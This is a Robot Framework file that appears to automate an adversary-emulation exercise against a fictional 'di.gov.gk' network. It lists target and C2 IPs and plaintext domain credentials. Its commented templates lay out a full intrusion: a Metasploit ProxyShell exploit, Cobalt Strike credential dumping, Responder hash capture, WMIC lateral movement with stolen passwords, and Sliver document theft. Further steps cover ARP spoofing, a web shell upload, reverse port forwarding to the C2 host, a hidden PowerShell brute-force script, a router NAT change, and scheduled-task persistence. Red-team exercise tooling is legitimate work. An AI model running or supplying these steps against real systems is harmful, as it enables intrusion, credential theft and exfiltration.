*** Variables ***

*** Variables ***

# Network Topology
${TARGET_DI_C2_96_IP}          31.148.54.96       # DI-C2-96 (c2_server)
${TARGET_DI_PIVOT_143_IP}      151.102.65.143    # DI-PIVOT-143 (pivot_host)
${TARGET_DI_TARGET_142_IP}     151.102.65.142    # DI-TARGET-142 (target_victim)
${TARGET_DI_TARGET_144_IP}     151.102.65.144    # DI-TARGET-144 (target_victim)
${TARGET_DI_TARGET_1_IP}       151.102.65.1    # DI-TARGET-1 (target_victim)
${TARGET_DI_TARGET_57_IP}      151.102.65.57    # DI-TARGET-57 (target_victim)
${TARGET_DI_TARGET_5_IP}       151.102.64.5    # DI-TARGET-5 (target_victim)
${TARGET_DI_TARGET_6_IP}       151.102.64.6    # DI-TARGET-6 (target_victim)
${TARGET_DI_TARGET_8_IP}       151.102.64.8    # DI-TARGET-8 (target_victim)

# Credentials
${ADMINISTRATOR_AT_DI_GOV_GK_USER}     Administrator@di.gov.gk    # email
${ADMINISTRATOR_USER}      Administrator    # ssh
${CISCO_USER}                cisco    # ssh
${EDUARDO_WHEELER_PASS}      bL+6oA6P@W+x
${EDUARDO_WHEELER_USER}      DI\eduardo.wheeler    # wmic
${FANNIE_SPARKS_USER}        fannie.sparks    # ssh
${OLIVER_JONES_AT_DI_GOV_GK_USER}     oliver.jones@di.gov.gk    # email
${OLIVER_JONES_PASS}         1R34llyL0v3P1zz4!
${OLIVER_JONES_USER}         oliver.jones    # powershell
${RODRIGO_ALLISON_PASS}      r4#Sw5GyL+5V
${RODRIGO_ALLISON_USER}      DI\rodrigo.allison    # wmic
${SHELIA_SERRANO_PASS}       xI#Yp6@4#8o#
${SHELIA_SERRANO_USER}       DI\shelia.serrano    # wmic

# C2 Infrastructure (TODO)
${CS_DIR}                /opt/cobaltstrike    # Cobalt Strike directory
${CS_IP}                 # TODO: C2_SERVER_IP    # Cobalt Strike server IP
${CS_PASS}               # TODO: C2_PASSWORD    # Cobalt Strike password
${CS_PORT}               50050    # Cobalt Strike port
${CS_USER}               # TODO: C2_USERNAME    # Cobalt Strike username

# Configuration
${BEACON_TIMEOUT}        2m    # C2 beacon check-in timeout
${LOG_FILENAME}          execution_log.csv

# File Paths
${ARTIFACT_DIR}          /home/user/Desktop    # Payload directory

*** Keywords ***

Get Local Terminal
    [Arguments]    ${host}    ${username}    ${password}    ${alias}
    [Documentation]    Establish SSH connection to local host
    Open Connection    ${host}    alias=${alias}    timeout=300s
    Login    ${username}    ${password}


# ============================================================================
# EXTRACTED COMMANDS (For Reference)
# ============================================================================
# Below are the commands extracted from Phase 1.
# Use these as templates for building test cases.


# Segment: Initial Access
# ----------------------------------------------------------------------
# [metasploit] msfconsole
# [metasploit] use exploit/windows/http/exchange_proxyshell_rce
# [metasploit] set RHOSTS 151.102.64.6
#          Target: 151.102.64.6
# [metasploit] set EMAIL Administrator@di.gov.gk
# [metasploit] set payload windows/x64/meterpreter/bind_tcp

# Segment: Discovery & Credential Harvesting
# ----------------------------------------------------------------------
# [cobalt strike beacon shell] shell ipconfig /all
# [cobalt strike] logonpasswords
# [cobalt strike] net domain_controllers
# [ssh] Ssh -p 2222 Administrator@localhost
#          Target: localhost
# [bash] Sudo ~/Responder/Responder.py -I ens33 -Pv

# Segment: Lateral Movement
# ----------------------------------------------------------------------
# [wmic] Shell wmic /node:”151.102.64.5”  /user:”DI\Administrator” /password:”P@ssw0rd” process call create “
#          Target: 151.102.64.5
# [cobalt strike] logonpasswords
# [cobalt strike] net computers
# [wmic] Shell wmic /node:”151.102.65.144”  /user:”DI\rodrigo.allison” /password:”r4#Sw5GyL+5V” process call 
#          Target: 151.102.65.144
# [wmic] Shell wmic /node:”151.102.65.142”  /user:”DI\shelia.serrano” /password:”xI#Yp6@4#8o#” process call c
#          Target: 151.102.65.142

# Segment: Beacon Interaction & Privilege Escalation
# ----------------------------------------------------------------------
# [windows] C:\Windows\System32\SymantecSysMonitor.exe
# [sliver] use
# [sliver] cd C:\\Users\\fannie.sparks\\Documents
# [sliver] ls
# [sliver] download GK_DEFINTEL_ProjectHelios_TechOverview.docx

# Segment: ARP Spoofing
# ----------------------------------------------------------------------
# [bash] cd ~/Arp-Spoofer
# [bash] sudo -E ./arpspoofer.py -i ens33 -f 151.102.65.1
#          Target: 151.102.65.1
# [bash] y

# Segment: Persistence
# ----------------------------------------------------------------------
# [cobalt strike] cd C:\inetpub\wwwroot\aspnet_client
#          Target: DI-WEB beacon
# [cobalt strike] upload /home/user/util.aspx
#          Target: DI-WEB beacon
# [cobalt strike] rportfwd 443 31.148.54.96 6666
#          Target: DI-W10-3 beacon

# Segment: Network Device Attack
# ----------------------------------------------------------------------
# [bash] cd /home/user/sshbrutesim
# [bash] python3 -m http.server 8080
# [metasploit/meterpreter] upload /home/user/run_brute.ps1
# [metasploit] shell powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File run_brute.ps1
# [cobalt strike] Socks 9050 socks5

# Segment: Anomalous Malicious Activity
# ----------------------------------------------------------------------
# [cobalt strike] Upload /home/user/clrhost.ps1
#          Target: DI-W10-3, DI-W10-5, DI-W11-5
# [cobalt strike shell] Shell schtasks /create /tn "Microsoft CLR Monitor" /tr "powershell.exe -ExecutionPolicy Bypass -Wind
#          Target: DI-W10-3, DI-W10-5, DI-W11-5

*** Test Cases ***

# ============================================================================
# AUTOMATED TEST CASES
# ============================================================================
# Each test case corresponds to a segment from Phase 1.
# Commands are listed as comments for reference.
# TODO: Uncomment and parameterize commands as needed.


Initial Access
    [Documentation]    Lines 1‑14 contain the exploit launch, payload upload, execution and the capture markers that bracket the initial compromise of the target system.
    [Tags]    segment-1

    # TODO: Implement 10 commands
    Log To Console    TODO: Execute segment commands
    # 1. [metasploit] msfconsole
    # 2. [metasploit] use exploit/windows/http/exchange_proxyshell_rce
    # 3. [metasploit] set RHOSTS 151.102.64.6
    # 4. [metasploit] set EMAIL Administrator@di.gov.gk
    # 5. [metasploit] set payload windows/x64/meterpreter/bind_tcp
    # 6. [metasploit] run
    # 7. [meterpreter] cd C:\Users\Administrator\Documents
    # 8. [meterpreter] upload /home/user/Desktop/AWSAuthService.exe C:\Users\Administrator\Documents\AW
    # 9. [meterpreter] execute -f "C:\Users\Administrator\Documents\AWSAuthService.exe"
    # 10. [meterpreter] exit

Discovery & Credential Harvesting
    [Documentation]    Starts with the 'Discovery' heading and includes network enumeration commands, credential dumping, and the MITM capture that gathers hashes.
    [Tags]    segment-2

    # TODO: Implement 5 commands
    Log To Console    TODO: Execute segment commands
    # 1. [cobalt strike beacon shell] shell ipconfig /all
    # 2. [cobalt strike] logonpasswords
    # 3. [cobalt strike] net domain_controllers
    # 4. [ssh] Ssh -p 2222 Administrator@localhost
    # 5. [bash] Sudo ~/Responder/Responder.py -I ens33 -Pv

Lateral Movement
    [Documentation]    All lines from the 'Lateral Movement' heading through remote WMIC execution, additional SSH sessions, Nmap scanning and mounted share copying represent spreading to other hosts.
    [Tags]    segment-3

    # TODO: Implement 12 commands
    Log To Console    TODO: Execute segment commands
    # 1. [wmic] Shell wmic /node:”151.102.64.5”  /user:”DI\Administrator” /password:”P@ssw0rd” p
    # 2. [cobalt strike] logonpasswords
    # 3. [cobalt strike] net computers
    # 4. [wmic] Shell wmic /node:”151.102.65.144”  /user:”DI\rodrigo.allison” /password:”r4#Sw5G
    # 5. [wmic] Shell wmic /node:”151.102.65.142”  /user:”DI\shelia.serrano” /password:”xI#Yp6@4
    # 6. [wmic] Shell wmic /node:”151.102.65.57”  /user:”DI\eduardo.wheeler” /password:”bL+6oA6P
    # 7. [wmic] Shell wmic /node:”151.102.64.8”  /user:”DI\Administrator” /password:”P@ssw0rd” p
    # 8. [ssh] ssh -p 2222 Administrator@localhost
    # 9. [nmap] sudo nmap -sV -O 151.102.65.143
    # 10. [ssh] ssh fannie.sparks@151.102.65.143
    # ... and 2 more commands

Beacon Interaction & Privilege Escalation
    [Documentation]    Contains DNS beacon captures, file downloads via the beacon, and creation of a new privileged AD account, indicating post‑exploitation activity.
    [Tags]    segment-4

    # TODO: Implement 14 commands
    Log To Console    TODO: Execute segment commands
    # 1. [windows] C:\Windows\System32\SymantecSysMonitor.exe
    # 2. [sliver] use
    # 3. [sliver] cd C:\\Users\\fannie.sparks\\Documents
    # 4. [sliver] ls
    # 5. [sliver] download GK_DEFINTEL_ProjectHelios_TechOverview.docx
    # 6. [nltest] nltest /DCLIST:DI
    # 7. [nslookup] nslookup di-dc.di.gov.gk
    # 8. [ssh] ssh -p 2222 Administrator@localhost
    # 9. [ssh] ssh fannie.sparks@151.102.64.5
    # 10. [powershell] powershell
    # ... and 4 more commands

ARP Spoofing
    [Documentation]    Lines dedicated to launching an ARP spoofing tool and related capture markers form an isolated network‑interception activity.
    [Tags]    segment-5

    # TODO: Implement 3 commands
    Log To Console    TODO: Execute segment commands
    # 1. [bash] cd ~/Arp-Spoofer
    # 2. [bash] sudo -E ./arpspoofer.py -i ens33 -f 151.102.65.1
    # 3. [bash] y

Persistence
    [Documentation]    Begins with the 'Persistence' heading and includes web‑shell deployment, open‑port forwarding and related capture sections that establish long‑term access.
    [Tags]    segment-6

    # TODO: Implement 3 commands
    Log To Console    TODO: Execute segment commands
    # 1. [cobalt strike] cd C:\inetpub\wwwroot\aspnet_client
    # 2. [cobalt strike] upload /home/user/util.aspx
    # 3. [cobalt strike] rportfwd 443 31.148.54.96 6666

Network Device Attack
    [Documentation]    All commands targeting routers/switches (HTTP server, PowerShell brute‑force script, proxychains SSH, NAT configuration) are grouped under this phase.
    [Tags]    segment-7

    # TODO: Implement 9 commands
    Log To Console    TODO: Execute segment commands
    # 1. [bash] cd /home/user/sshbrutesim
    # 2. [bash] python3 -m http.server 8080
    # 3. [metasploit/meterpreter] upload /home/user/run_brute.ps1
    # 4. [metasploit] shell powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File run_brute
    # 5. [cobalt strike] Socks 9050 socks5
    # 6. [bash] proxychains ssh cisco@151.102.65.1 (need to check proxychains4.conf)
    # 7. [cisco ios] conf t
    # 8. [cisco ios] ip nat inside source static tcp 151.102.65.1 443 interface GigabitEthernet3 8443
    # 9. [cisco ios] end

Anomalous Malicious Activity
    [Documentation]    Final set of commands uploading and scheduling a CLR monitoring script across multiple hosts, representing residual malicious actions.
    [Tags]    segment-8

    # TODO: Implement 2 commands
    Log To Console    TODO: Execute segment commands
    # 1. [cobalt strike] Upload /home/user/clrhost.ps1
    # 2. [cobalt strike shell] Shell schtasks /create /tn "Microsoft CLR Monitor" /tr "powershell.exe -Executio